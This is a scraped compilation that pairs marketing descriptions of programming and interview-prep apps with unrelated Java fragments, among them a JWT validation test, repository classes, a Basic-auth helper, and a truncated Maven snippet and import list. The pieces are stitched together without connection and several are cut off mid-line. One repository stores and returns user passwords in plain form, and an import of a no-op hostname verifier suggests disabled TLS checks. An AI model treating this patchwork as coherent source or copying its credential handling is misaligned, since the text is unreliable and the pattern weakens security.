With "Algorithms: Explained and Animated", you can firmly strengthen that fundamental knowledge.

 

 

[ People interested in programming and information technology ]

 

While there are many technical books on programming and the internet, their simple drawings and long explanations don't facilitate learning as much as they do boredom. With "Algorithms: Explained and Animated", anything from complex data structures like "hash tables" and "heaps" to information security topics like the "public-key cryptosystem" and "digital certificates" can be easily understood with animations.

 

 

[ Experienced programmers and engineers ]

 

When using standard methods like libraries, the more basic the concept, the more impenetrable it can seem. You might also find yourself struggling to explain concepts to a less-experienced colleague. For times like those, use "Algorithms: Explained and Animated" to keep your skills from getting rusty.

 

 

==== Downloading and Viewing All of the Algorithms ====

 

This app is free to download. A portion of the app's topics can be viewed after choosing to "Purchase all algorithms".

 

 

==== On Tablet ====

 

This app is also compatible for use on tablet.

 

 

==== Supported languages ====

 

- English

- Español (Spanish)

- Português (Portuguese)

- 中文 (简体字) (Chinese (Simplified))

- Русский (Russian)

- 日本語 (Japanese)

- 한국어 (Korean)

Show less

 

 

 

 

 

www.prghub.com

 

 

 

 

The description of JSOne

Learn JavaScript's important concepts especially for Interviews. We use oneLiner approach for important concepts. The oneLiner makes JavaScript's important concepts easier to understand and keep them in mind.

Data Structure and Algorithms questions and frequently asked coding questions are also included.

The concepts have easy explanation with sample code.

The app contains collection of frequently asked questions in JavaScript interviews.

Full content is available offline and the content is frequently updated.

The Content is developed by experienced professionals working full time in JavaScript.

The content also serve the purpose of advanced tutorial on JavaScript.

 

The app also includes some data structure and algorithms questions in JavaScript (in development) along with webapp design thinking for interviews. There are also coding questions frequently asked in the interviews.

 

For Interview Questions on HTML and CSS please try our app UiOne on Play Store.

https://play.google.com/store/apps/details?id=com.gamesmint.uione

 

 

 

Den of Geeks

This app contains Computer Science related articles/videos primarily from YouTube and will be covering other platforms as well.

 

This app helps you a lot for preparing for IT interviews as well to enhance your design skills

 

In the Design Section, we have added videos for the following topics

1. Whatsapp/Facebook Messenger Design

2. Twitter Design

3. Netflix Design

4. Tiny URL

5. Uber/Ola Design

6. Rate Limiter Design

7. Book My Show Design

8. Facebook NewsFeed Design

9. Youtube Design

10. Sharding, Consistent Hashing, Scaling

11. SQL Vs NoSql

12. Horizontal Vs. Vertical Scaling

and many others

 

In Frontend Section we have added videos for following topics

1. JavaScript Interview Question and Concepts

2. Android

3. React/Redux

 

In the Programming Section, we have added videos for following topics

1. How to start programming

2. Famous DS/Algo Questions

3. DP

4. Explanation of Basic Algorithms

 

Amazon Interview Questions

Facebook Interview Questions

Microsoft Interview Questions

Google Interview Questions

Dynamic Programming

OOPS Design Pattern

Head First Design Pattern

Array, Trees, Linked List, Hash Maps, Binary Trees, BST

Coding Problems

Python, Java, NodeJS, Golang, C, C++

Algorithm Design and Problem Solving

 

System Analysis And Design

Time Complexity Calculation

Big O notation

Greedy

Divide & Conquer

Binary Search

Backtrack

Recursion

Object oriented Design

Technical Interview questions and answers

Interview skills

 

Placement Interview Experience

Crack IT Interview

Cracking technical Interview

Js Interview Question & Answers

Android Interview Question & Answers

Computer Interview Ques & Answers

Technical Interview Quest & Answers

 

Resources --

Geeks For Geeks

Cracking the Coding Interview

Career Cup

Donne Martin

Leet Code

Educative io

Pluralsight

Grokking system design

Gaurav Sen videos

Akshay Saini videos

Tushar Roy videos

Narendra L videos

Rachit Jain videos

 

 

 

Will keep on adding more content regularly.

 

 

The content for which "Geeks Den" doesn't have the copyrights are showcased by embedding the youtube links, which would, in turn, help the content owners to have more views on their youtube videos.

 

Note: If you also make such awesome videos and want to screen your content OR If you have any other channel or videos in mind which should be added. Please contact us at devlab.feedback@gmail.com. We would Love to hear from you.

 

Disclaimer: Geeks Den doesn't own or host the above content. It only catalogs the content and redirects to the content aggregators or hosting services such as Youtube. It is not an alternative to watch paid content for free nor affiliated with any of the on above platforms.

 

 

 

 

The description of CodeGym

Learn Java programming from scratch on your smartphone with the educational quest game from creators of CodeGym. The course consists of 1200 tasks and 600 mini-lectures.

 

If you dream of becoming a programmer, but you’re short of time for learning on courses with a demanding schedule, here’s a solution. With this app, you can devote as much time for your learning as you have, and practice wherever you want. Even 30 minutes a day would be enough for reading a couple of lectures or solving a few tasks :)

 

Our Java programming course is designed in a playing format and includes four quests. Each quest consists of 10 levels with lectures and tasks. Imagine you play a game and skill-up your character along with actually learning how to code!

 

Of course, it’s quite a tough task to write dozens of code lines on your smartphone. With this aim in view, we’ve developed a fully-featured system of auto expands and tips to help you code faster. After you write the solution, send it for review and get instant verification.

 

There’s a whole lot of Java tasks in the course, such as:

 

- Writing your code;

- Fixing existing code;

- Self-consistent mini-projects and games.

 

If you run into sticky points while solving any task, feel free to ask for a hint in the help section and get advice from other students or course developers.

 

We save your progress, so you can return to learning any minute and continue with solving tasks or reading lectures.

 

Learn Java fundamentals the right way — through coding practice!

 

 

 

The description of Interview Question and Answers

Looking for Job Interview Questions with Answers App ? You're at the right place.

 

Placecom - "Interview Guide" provides you a wide range of Interview questions (with smart answers) that an organization demands from candidates.

 

★★★ Features ★★★

 

★ 40 Most Important Interview Questions covered for each Subject Areas ( Total 500+ Questions )

★ 14 Different Subjects covered

- General (HR)

- Java

- .NET

- PHP

- DBMS

- Data Structure

- Finance

- Marketing

- Electronics

- C/C++

- Networking

- Software Testing

- Android

- Unix

★ Useful for Freshers & Experienced Professionals

★ GD Tips & Topics

★ Free Resume Sample & Review

★ Best Interview Guide & Aptitude Preparation

★ Logical Reasoning, Verbal, Maths, Puzzles covered with a sample paper, easily downloadable.

★ Easy to use GUI and Navigation Controls

★ Simply Fast and Requires NO Internet Connection

★ Best for preparing your resume before Interview

★ Helps you rehearse/practice own answers & compare them

★ Answers important interview tips like

- What to do when you don't know the Answer ?

- What to wear on the day of Interview ?

★ Strong Services & We do really work on your feedback..!!

 

The app is an attempt to distribute the well-appraised Placecom Books, that will instill you with the confidence that you need to endure most difficult interviews. These most asked Job Interview Questions and Answers are the result of 2 years of research in recruitment field. App also includes Job Interview Tips on designing a resume and wearing clothes on the day of Interview. This Best "INTERVIEW GUIDE" is unique in that it helps you master the most commonly asked Technical Interview Questions and HR Interview Questions, instilling you with the confidence that you need to endure the most difficult of job interviews.

 

It's a FREE Interview App and will remain FREE forever. Use this "INTERVIEW GUIDE" as much as possible to excel at your Job Interviews.

 

We look forward to your review & suggestions. We're open for feedback from almost every social media & email.

 

★ Google : www.goo.gl/qpUER3

★ Facebook : www.facebook.com/placecomapp

★ Twitter : www.twitter.com/placecomapp

★ LinkedIn : www.linkedin.com/placecomapp

 

We hope this simple HR Interview Preparation Guide & FREE Resume Preparation helps you strengthen your Interview Preparation.

 

 

The description of Interview Skills

If you are looking an app for sharping your technical skills as well as your mind capabilities than Interview Skills is for you. Interview Skills has All Engineering Stream & MBA related frequently asked interview questions & answer, Aptitude, Mathematical formulas, Quizzes, puzzles, GK & some useful tips that helps you to crack your interviews as well as your competitive exams. Interview Skills may be useful for you to get the success.

 

The Interview Skills is useful for fresher as well experienced employees to improve their interview skills & sharp their mind capability. It’s a most effective time saver app for those who make a deep research on searching interview related queries & aptitude questions on web & play quizzes and solve puzzles also. It’s material design and colourful themes definitely catch your eyes.

 

Features:

This app totally offline, so you can practice your interview related questions, aptitude, play quiz & solve puzzles anywhere, anytime without internet.

frequently asked interview questions & answers,

best for practice for competitive exams,

Mathematics formulas

Aptitude questions with detailed solution

Quizzes & Puzzles

GK & Some Tips

Almost all types Job related solution in single place

 

Interviews Skills Covered 7 useful Subjects:

Aptitude Questions & Formulas

Mathematics Formulas

Computer Science

Mechanical Engineer

Electronics Engineer

Electrical Engineer

Chemical Engineer

MBA

Soft Skills

Quizzes

Puzzles

GK

Interview Tips

 

Topics covered in Computer Science

General Questions

Engineering Topics:

Computer Science

14 Different Programming languages covered

C

C++

JAVA

Android

Kotlin

Objective C

Swift

.NET

PHP

Node.js

Angular JS

MySql

SEO

Quality Analyst

 

Mechanical Engineer

Electronics Engineer

Electrical Engineer

Chemical Engineer

 

Topics covered in MBA

General Questions

Finanace

Marketing

 

Regular updates

 

What's new in next release:

I'm working on making UI more responsive and add some new questions, quizzes and puzzles or some new useful features.

 

We try to provide more useful new feature in every new version

We look forward to your reviews and suggestion to make this app more helpful for all the users. We're open for feedback any time.

 

You can Follow us on Facebook/Instagram for latest updates https://www.facebook.com/interview.skills01

https://www.instagram.com/interview.skills

 

 

 

 

What's new in next release:

I'm working on making UI more responsive and add some new questions, quizzes and puzzles or some new useful features.

 

We try to provide more useful new feature in every new version

We look forward to your reviews and suggestion to make this app more helpful for all the users. We're open for feedback any time.

 

You can Follow us on Facebook/Instagram for latest updates https://www.facebook.com/interview.skills01

https://www.instagram.com/interview.skills

Show less

Interview Skills 3.4 Update

2019-10-30

Update Booklets and migrate to Android x

 

 

 

The description of DATA STRUCTURE MADE EASY

CS students easily review data structures and algorithms from theory, implementation to coding problems. If you are a programmer looking for your first programming job and preparing for coding interviews, or a student who is preparing for exams about data structures, this app could be a right fit for you.All the algorithms and data structures are implemented in C++ or C or python. Therefore, if you want to use the App to learn coding, please make sure you are comfortable with these languages.

 

Currently this app has the following sections:

- Array

- String

- Linked List

- Stack

- Queue

- Tree

- Graph

- Interviews Questions

 

Each section contains the theory notes to help users to understand the concepts and several coding problems to improve their familiarity to the data structures.

 

Although currently we focuses on data structures but we plan to extend the app to have more other content, from basic language tutorials to high level architecture knowledges.

 

Some words from the developer of this app:

 

Note that all these notes were done by me with some references to some textbooks or online coding questions I did before. They are not as accurate as a textbook. As this is a very early release, there are definitely some issues in the notes and I am trying my best to find them and correct them. I will keep optimizing the content and functionality to make it better every day. If you find any issue when you are using it, it will be much appreciated if you could send a message to anilabha911@gmail.com.

 

Currently all the content of this app was prepared when I just graduated from university and was preparing for coding interviews. At that time I was pretty confident that I could get a good job as I had done many projects in school and I was very good at building web and mobile applications.

 

However, things did not go as I expected. During the interviews, the interviewers asked me to write codes to solve problems on the whiteboard. Many times, I got stuck on the problems and could not figure out a single solution. Even when I completed a solution and felt happy, the interviewers often immediately pointed out the problem of my code. Not efficient enough, use too much memory space, or did not consider the boundary situations. I felt disappointed to myself.

 

Fortunately, I got a pretty good offer from a company and started my career as a web developer. But even now I still feel hard to complete these algorithms questions.

 

I know preparing for coding interviews is not easy, but it is not that hard. It is just a process that we need to go through to become good developers.

 

These are all the purposes of this app. I use it every day to review my knowledges on data structures. I hope it could not only help myself, but also help more developers who are fighting for their careers.

 

 

 

The description of Enki

The #1 app to learn data science, learn to code, stay on top of tech trends, or to keep improving as a developer! Topics include SQL, Data Science, JavaScript, Python, Blockchain, CSS, HTML, Security, git, CompSci fundamentals, Linux and Java.

 

Make progress through the structured curriculum in each topic. Quickly and easily discover new ideas, practice new concepts, and answer interactive quizzes.

 

Over 1 million people have used Enki to learn data science, new technical topics, to learn to code, or to fill in knowledge gaps in topics they're familiar with already. If you use the app for a few weeks you’ll see the results for yourself.

 

Here's what Enki users are saying in the reviews:

 

"The best programming app out there, UX is god class"

 

"So far I am learning a lot of new information! The small daily tasks really keep you focused and on track while not consuming all your time. It's a good format."

 

"I love this app, helps me learn on a daily basis and keeps me accountable for being on point when it comes to coding"

 

"Quick workouts are great for learning how to code on my lunch breaks."

 

"Wonderful app, really, well designed and all workouts are perfectly designed, ads are not disruptive and the text is perfectly comprehensible. Even beginners can understand what is written in all workouts (provided they select the beginner level). Recommended for everyone, from programming masters to beginners!"

 

To learn more, visit www.enki.com

 

 

 

The description of Algorithm Visualizer

Algorithm Visualizer lets you visualize various algorithms and data structures.

 

Algorithm visualizer is completely free and ad-free.

 

Currently the following visualizations are available -

- Binary Search

- Breadth first search and depth first search graph traversal

- Dijkstara and Bellman Ford graph search

- Sorting (Insertion sort and Bubble sort)

- Binary Search Tree (Search and create)

- Linked List (Insert, delete, traverse)

- Stack (Push, pop, peek)

 

Descriptions, complexities and references are also provided along with the code for the visualization and implementation.

 

Algorithm Visualizer is open source and is available on Github - https://github.com/naman14/AlgorithmVisualizer-Android

Show less

 

 

 

The description of Daily Programmer

An app for coders, developers or students: daily coding challenges for learning, refreshing or just for fun!

 

Features difficulty filtering, syntax highlighting, a dark theme and a responsive layout for phones, tablets and desktops.

 

LEARN WITH THE COMMUNITY - We have an active Telegram group and a Discord server where we chat about coding and other nerd things, join! Look into the app for the invite links.

 

FREE & OPEN SOURCE - The entire project is free and open source, come and contribute! https://github.com/avivace/dailyProgrammer

 

WEB UNIVERSAL VERSION - You can access the application from any device and any browser going to https://avivace.ovh/dp_zero/

 

A material design frontend to /r/dailyprogrammer challenges providing exclusive features.

Show less

Daily Programmer 1.2 Update

2017-03-16

Fixed a bug preventing the use of local storage for the app preferences.
----------------------------------------------------------------------------------------
import com.github.tomakehurst.wiremock.junit.WireMockRule;
import com.ixortalk.aws.cognito.boot.config.JwtAutoConfiguration;
import com.ixortalk.aws.cognito.boot.config.JwtIdTokenCredentialsHolder;
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.JWSObject;
import com.nimbusds.jose.JWSSigner;
import com.nimbusds.jose.Payload;
import com.nimbusds.jose.crypto.RSASSASigner;
import com.nimbusds.jose.jwk.RSAKey;
import com.nimbusds.jose.proc.BadJOSEException;
import com.nimbusds.jwt.proc.BadJWTException;
import org.junit.After;
import org.junit.Before;
import org.junit.Rule;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.ConfigFileApplicationContextInitializer;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.context.web.WebAppConfiguration;

import java.text.ParseException;

import static com.github.tomakehurst.wiremock.client.WireMock.*;
import static com.ixortalk.aws.cognito.boot.filter.util.FileUtil.jsonFile;
import static org.apache.http.HttpStatus.SC_OK;
import static org.assertj.core.api.Assertions.assertThat;

@RunWith(SpringRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = JwtAutoConfiguration.class,initializers = ConfigFileApplicationContextInitializer.class)
public class AwsCognitoIdTokenProcessorTest {

    private static final String KNOWN_KID = "1486832567";
    private static final String UNKNOWN_KID = "000000000";
    @Rule
    public WireMockRule wireMockRule = new WireMockRule(65432);

    protected static final String JWKS = jsonFile("jwk/keys.json");

    @Autowired
    private AwsCognitoIdTokenProcessor awsCognitoIdTokenProcessor;

    @Autowired
    private JwtIdTokenCredentialsHolder jwtIdTokenCredentialsHolder;

    private MockHttpServletRequest request = new MockHttpServletRequest();

    private MockHttpServletResponse response = new MockHttpServletResponse();

    private Authentication userAuthentication = new UsernamePasswordAuthenticationToken("marissa", "koala");

    @Before
    public void init() {
        setupJwkResource(JWKS);
    }

    @After
    public void clear() {
        SecurityContextHolder.clearContext();
    }

    @Test(expected = ParseException.class)
    public void whenAuthorizationHeaderWithInvalidJWTValueProvidedParseExceptionOccurs() throws Exception {
        request.addHeader("Authorization", "Invalid JWT");
        awsCognitoIdTokenProcessor.getAuthentication(request);
    }

    @Test(expected = ParseException.class)
    public void whenAuthorizationHeaderWithEmptyJWTValueProvidedParseExceptionOccurs() throws Exception {
        request.addHeader("Authorization", "");
        awsCognitoIdTokenProcessor.getAuthentication(request);
    }

    @Test
    public void whenNoAuthorizationHeaderProvidedParseExceptionOccurs() throws Exception {
        assertThat(awsCognitoIdTokenProcessor.getAuthentication(request)).isNull();
    }

    @Test(expected = ParseException.class)
    public void whenUnsignedAuthorizationHeaderProvidedParseExceptionOccurs() throws Exception {
        request.addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTMzNywidXNlcm5hbWUiOiJqb2huLmRvZSJ9");
        assertThat(awsCognitoIdTokenProcessor.getAuthentication(request)).isNull();
    }


    @Test(expected = BadJOSEException.class)
    public void whenSignedJWTWithoutMatchingKeyInAuthorizationHeaderProvidedParseExceptionOccurs() throws Exception {
        request.addHeader("Authorization", newJwtToken(UNKNOWN_KID,"role1").serialize());
        assertThat(awsCognitoIdTokenProcessor.getAuthentication(request)).isNull();
    }

    @Test
    public void whenSignedJWTWithMatchingKeyInAuthorizationHeaderProvidedAuthenticationIsReturned() throws Exception {
        request.addHeader("Authorization", newJwtToken(KNOWN_KID,"role1").serialize());
        Authentication authentication =  awsCognitoIdTokenProcessor.getAuthentication(request);
        assertThat(authentication.isAuthenticated()).isTrue();
    }

    @Test(expected = BadJWTException.class)
    public void whenExpiredJWTWithMatchingKeyInAuthorizationHeaderProvidedAuthenticationIsReturned() throws Exception {
        request.addHeader("Authorization", newJwtToken(KNOWN_KID,"expired").serialize());
        awsCognitoIdTokenProcessor.getAuthentication(request);
    }


    protected void setupJwkResource(String assetResponse) {
        wireMockRule.stubFor(get(urlEqualTo("/.well-known/jwks.json"))
                .willReturn(
                        aResponse()
                                .withBody(assetResponse)
                                .withStatus(SC_OK)
                ));
    }

    private JWSObject newJwtToken(String kid,String role) throws Exception {

        RSAKey rsaKey = RSAKey.parse(jsonFile("jwk/private_key.json"));
        JWSSigner signer = new RSASSASigner(rsaKey);

        JWSObject jwsObject = new JWSObject(
                new JWSHeader.Builder(JWSAlgorithm.RS256).keyID(kid).build(),
                new Payload(jsonFile("jwk/payload-" + role + ".json")));

        jwsObject.sign(signer);

        return jwsObject;

    }
}
----------------------------------------------------------------------------------------
    <plugin>
                    <groupId>org.sonatype.plugins</groupId>
                    <artifactId>nexus-staging-maven-plugin</artifactId>
                    <version>1.6.8</version>
                    <extensions>true</extensions>
                    <configuration>
                        <serverId>ossrh</serverId>
                        <nexusUrl>https://oss.sonatype.org/</nexusUrl>
                        <autoreleaseafterclose>true</autoreleaseafterclose>
                    </configuration>
                </plugin
----------------------------------------------------------------------------------------
import java.util.ArrayList;
import java.util.List;
import java.util.TreeMap;

public enum Server {
    ENUM_DEFAULT;


    private static TreeMap<String, Server> valueMap = new TreeMap<String, Server>();
    private String value;

    static {
        ENUM_DEFAULT.value = "default";

        valueMap.put("default", ENUM_DEFAULT);
    }

    /**
     * Returns the enum member associated with the given string value
     * @return The enum member against the given string value */
    @com.fasterxml.jackson.annotation.JsonCreator
    public static Server fromString(String toConvert) {
        return valueMap.get(toConvert);
    }

    /**
     * Returns the string value associated with the enum member
     * @return The string value against enum member */
    @com.fasterxml.jackson.annotation.JsonValue
    public String value() {
        return value;
    }
        
    /**
     * Get string representation of this enum
     */
    @Override
    public String toString() {
        return value.toString();
    }

    /**
     * Convert list of Server values to list of string values
     * @param toConvert The list of Server values to convert
     * @return List of representative string values */
    public static List<String> toValue(List<Server> toConvert) {
        if(toConvert == null)
            return null;
        List<String> convertedValues = new ArrayList<String>();
        for (Server enumValue : toConvert) {
            convertedValues.add(enumValue.value);
        }
        return convertedValues;
    }
}
----------------------------------------------------------------------------------------
import com.squareup.moshi.internal.Util;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

/**
 * Magic that creates instances of arbitrary concrete classes. Derived from Gson's UnsafeAllocator
 * and ConstructorConstructor classes.
 *
 * @author Joel Leitch
 * @author Jesse Wilson
 */
abstract class ClassFactory<T> {
  abstract T newInstance() throws
      InvocationTargetException, IllegalAccessException, InstantiationException;

  public static <T> ClassFactory<T> get(final Class<?> rawType) {
    // Try to find a no-args constructor. May be any visibility including private.
    try {
      final Constructor<?> constructor = rawType.getDeclaredConstructor();
      constructor.setAccessible(true);
      return new ClassFactory<T>() {
        @SuppressWarnings("unchecked") // T is the same raw type as is requested
        @Override public T newInstance() throws IllegalAccessException, InvocationTargetException,
            InstantiationException {
          Object[] args = null;
          return (T) constructor.newInstance(args);
        }
        @Override public String toString() {
          return rawType.getName();
        }
      };
    } catch (NoSuchMethodException ignored) {
      // No no-args constructor. Fall back to something more magical...
    }

    // Try the JVM's Unsafe mechanism.
    // public class Unsafe {
    //   public Object allocateInstance(Class<?> type);
    // }
    try {
      Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
      Field f = unsafeClass.getDeclaredField("theUnsafe");
      f.setAccessible(true);
      final Object unsafe = f.get(null);
      final Method allocateInstance = unsafeClass.getMethod("allocateInstance", Class.class);
      return new ClassFactory<T>() {
        @SuppressWarnings("unchecked")
        @Override public T newInstance() throws InvocationTargetException, IllegalAccessException {
          return (T) allocateInstance.invoke(unsafe, rawType);
        }
        @Override public String toString() {
          return rawType.getName();
        }
      };
    } catch (IllegalAccessException e) {
      throw new AssertionError();
    } catch (ClassNotFoundException | NoSuchMethodException | NoSuchFieldException ignored) {
      // Not the expected version of the Oracle Java library!
    }

    // Try (post-Gingerbread) Dalvik/libcore's ObjectStreamClass mechanism.
    // public class ObjectStreamClass {
    //   private static native int getConstructorId(Class<?> c);
    //   private static native Object newInstance(Class<?> instantiationClass, int methodId);
    // }
    try {
      Method getConstructorId = ObjectStreamClass.class.getDeclaredMethod(
          "getConstructorId", Class.class);
      getConstructorId.setAccessible(true);
      final int constructorId = (Integer) getConstructorId.invoke(null, Object.class);
      final Method newInstance = ObjectStreamClass.class.getDeclaredMethod("newInstance",
          Class.class, int.class);
      newInstance.setAccessible(true);
      return new ClassFactory<T>() {
        @SuppressWarnings("unchecked")
        @Override public T newInstance() throws InvocationTargetException, IllegalAccessException {
          return (T) newInstance.invoke(null, rawType, constructorId);
        }
        @Override public String toString() {
          return rawType.getName();
        }
      };
    } catch (IllegalAccessException e) {
      throw new AssertionError();
    } catch (InvocationTargetException e) {
      throw Util.rethrowCause(e);
    } catch (NoSuchMethodException ignored) {
      // Not the expected version of Dalvik/libcore!
    }

    // Try (pre-Gingerbread) Dalvik/libcore's ObjectInputStream mechanism.
    // public class ObjectInputStream {
    //   private static native Object newInstance(
    //     Class<?> instantiationClass, Class<?> constructorClass);
    // }
    try {
      final Method newInstance = ObjectInputStream.class.getDeclaredMethod(
          "newInstance", Class.class, Class.class);
      newInstance.setAccessible(true);
      return new ClassFactory<T>() {
        @SuppressWarnings("unchecked")
        @Override public T newInstance() throws InvocationTargetException, IllegalAccessException {
          return (T) newInstance.invoke(null, rawType, Object.class);
        }
        @Override public String toString() {
          return rawType.getName();
        }
      };
    } catch (Exception ignored) {
    }

    throw new IllegalArgumentException("cannot construct instances of " + rawType.getName());
  }
}
----------------------------------------------------------------------------------------
  @Override
  public void applyToParams(List<Pair> queryParams, Map<String, String> headerParams) {
    if (username == null && password == null) {
      return;
    }
    String str = (username == null ? "" : username) + ":" + (password == null ? "" : password);
    try {
      headerParams.put("Authorization", "Basic " + Base64.encodeToString(str.getBytes("UTF-8"), false));
    } catch (UnsupportedEncodingException e) {
      throw new RuntimeException(e);
    }
  }
----------------------------------------------------------------------------------------
import java.util.Locale;

import static com.squareup.protoparser.Utils.checkNotNull;

/**
 * Representation of a scalar, map, or named type. While this class is an interface, only the
 * included implementations are supported.
 */
public interface DataType {
  enum Kind {
    /** Type is a {@link ScalarType}. */
    SCALAR,
    /** Type is a {@link MapType}. */
    MAP,
    /** Type is a {@link NamedType}. */
    NAMED
  }

  /** The kind of this type (and therefore implementing class). */
  Kind kind();

  enum ScalarType implements DataType {
    ANY,
    BOOL,
    BYTES,
    DOUBLE,
    FLOAT,
    FIXED32,
    FIXED64,
    INT32,
    INT64,
    SFIXED32,
    SFIXED64,
    SINT32,
    SINT64,
    STRING,
    UINT32,
    UINT64;

    @Override public Kind kind() {
      return Kind.SCALAR;
    }

    @Override public String toString() {
      return name().toLowerCase(Locale.US);
    }
  }

  final class MapType implements DataType {
    public static MapType create(DataType keyType, DataType valueType) {
      return new MapType(checkNotNull(keyType, "keyType"), checkNotNull(valueType, "valueType"));
    }

    private final DataType keyType;
    private final DataType valueType;

    private MapType(DataType keyType, DataType valueType) {
      this.keyType = keyType;
      this.valueType = valueType;
    }

    @Override public Kind kind() {
      return Kind.MAP;
    }

    public DataType keyType() {
      return keyType;
    }

    public DataType valueType() {
      return valueType;
    }

    @Override public String toString() {
      return "map<" + keyType + ", " + valueType + ">";
    }

    @Override public boolean equals(Object obj) {
      if (obj == this) return true;
      if (!(obj instanceof MapType)) return false;
      MapType other = (MapType) obj;
      return keyType.equals(other.keyType) && valueType.equals(other.valueType);
    }

    @Override public int hashCode() {
      return keyType.hashCode() * 37 + valueType.hashCode();
    }
  }

  final class NamedType implements DataType {
    public static NamedType create(String name) {
      return new NamedType(checkNotNull(name, "name"));
    }

    private final String name;

    private NamedType(String name) {
      this.name = name;
    }

    public String name() {
      return name;
    }

    @Override public Kind kind() {
      return Kind.NAMED;
    }

    @Override public String toString() {
      return name;
    }

    @Override public boolean equals(Object obj) {
      if (obj == this) return true;
      if (!(obj instanceof NamedType)) return false;
      NamedType other = (NamedType) obj;
      return name.equals(other.name);
    }

    @Override public int hashCode() {
      return name.hashCode();
    }
  }
}
----------------------------------------------------------------------------------------
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.core.PreparedStatementCreator;
import org.springframework.jdbc.core.RowMapper;
import org.springframework.jdbc.support.KeyHolder;
import org.springframework.stereotype.Repository;

import srt.data.domain.management.User;

@Repository
public class SimpleUserRepositoryImpl implements IUserRepository {
	
	private JdbcTemplate jdbc;
	private KeyHolder keyHolder;
	
	private static final UserRowMapper ROWMAPPER = new UserRowMapper();
	
	@Autowired
	public SimpleUserRepositoryImpl(JdbcTemplate jdbc, KeyHolder keyHolder) {
		this.jdbc = jdbc;
		this.keyHolder = keyHolder;
	}

	@Override
	public User getUserByUserId(Long userId) {
		List<User> userList = jdbc.query(new StringBuilder(UserRowMapper.SELECT_WITH_NO_CRITERIA).append(UserRowMapper.SELECT_CRITERIA_BY_USERID).toString(), ROWMAPPER, userId);
		if (userList == null || userList.size() == 0) {
			return null;
		}
		return userList.get(0);
	}

	@Override
	public User getUsersByUserName(String userName) {
		List<User> users=jdbc.query(new StringBuilder(UserRowMapper.SELECT_WITH_NO_CRITERIA).append(UserRowMapper.SELECT_CRITERIA_BY_USERNAME).toString(), ROWMAPPER, userName);
		if(users!=null && users.size()>0){
			return users.get(0);
		}
		return null;
	}

	@Override
	public int addUser(User user) {
		int rows = jdbc.update(new PreparedStatementCreator() {
			public PreparedStatement createPreparedStatement(Connection con) throws SQLException {
				String sql="INSERT INTO Users (userName, userDescription, password) VALUES (?,?,?)";
		        PreparedStatement ps=con.prepareStatement(sql, Statement.RETURN_GENERATED_KEYS);
		        ps.setString(1,user.getUserName());
		        ps.setString(2, user.getUserDescription());
		        ps.setString(3, user.getPassword());
		        return ps;
			}
		}, keyHolder);
		Long userId=keyHolder.getKey().longValue();
		user.setUserId(userId);
		return rows;
	}

	@Override
	public int updateUser(User user) {
		Long userId = user.getUserId();
		if (userId == null || userId < 0) {
			return -1;
		}
		return jdbc.update("UPDATE Users set userName=?, userDescription=? WHERE userId=?", user.getUserName(), user.getUserDescription(), userId);
	}

	@Override
	public int removeUserByUserId(Long userId) {
		if(userId==null || userId<0){
			return -1;
		}
		return jdbc.update("DELETE FROM Users WHERE userId=?", userId);
	}
	
	public static class UserRowMapper implements RowMapper<User> {

		public static final StringBuilder SELECT_WITH_NO_CRITERIA = new StringBuilder(
				"SELECT userId, userName, userDescription, password FROM Users");
		public static final StringBuilder SELECT_CRITERIA_BY_USERID = new StringBuilder(" WHERE userId=?");
		public static final StringBuilder SELECT_CRITERIA_BY_USERNAME = new StringBuilder(" WHERE userName=?");
		
		public User mapRow(ResultSet rs, int rowNum) throws SQLException {
			User user = new User();
			user.setUserId(rs.getLong(1));
			user.setUserName(rs.getString(2));
			user.setUserDescription(rs.getString(3));
			user.setPassword(rs.getString(4));
			return user;
		}

	}

}
----------------------------------------------------------------------------------------
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.mongodb.core.MongoTemplate;
import org.springframework.data.mongodb.core.query.Criteria;
import org.springframework.data.mongodb.core.query.Query;
import org.springframework.data.mongodb.core.query.Update;
import org.springframework.stereotype.Repository;

import srt.data.domain.Module;

@Repository
public class SimpleModuleRepository implements IModuleRepository{

	@Autowired
	private MongoTemplate mongo;
	
	@Override
	public void updateModule(Module module) {
		mongo.findAndModify(Query.query(Criteria.where("id").is(module.getId())), 
				Update.update("name", module.getName())
					.set("description", module.getDescription())
					.set("status", module.getStatus())
					.set("parentModuleId", module.getParentModuleId())
					.set("subModuleIdList", module.getSubModuleIdList())
					.set("attachmentPathList", module.getAttachmentPathList()), 
				Module.class);
	}

	@Override
	public void addModule(Module module) {
		mongo.insert(module);	
	}

	@Override
	public List<Module> getAllModules(){
		return mongo.findAll(Module.class);
	}
	
	@Override
	public Module getModuleByModuleId(String moduleId) {
		return mongo.findById(moduleId, Module.class);
	}

	@Override
	public void removeModuleByModuleId(String moduleId) {
		mongo.findAndRemove(Query.query(Criteria.where("id").is(moduleId)), Module.class);
	}

}

----------------------------------------------------------------------------------------
import org.apache.http.client.HttpClient;
import org.apache.http.conn.ssl.NoopHostnameVerifier;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.ssl.SSLContexts;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.core.io.Resource;
import org.springframework.http.HttpStatus;
import org.springframework.http.client.ClientHttpRequestFactory;
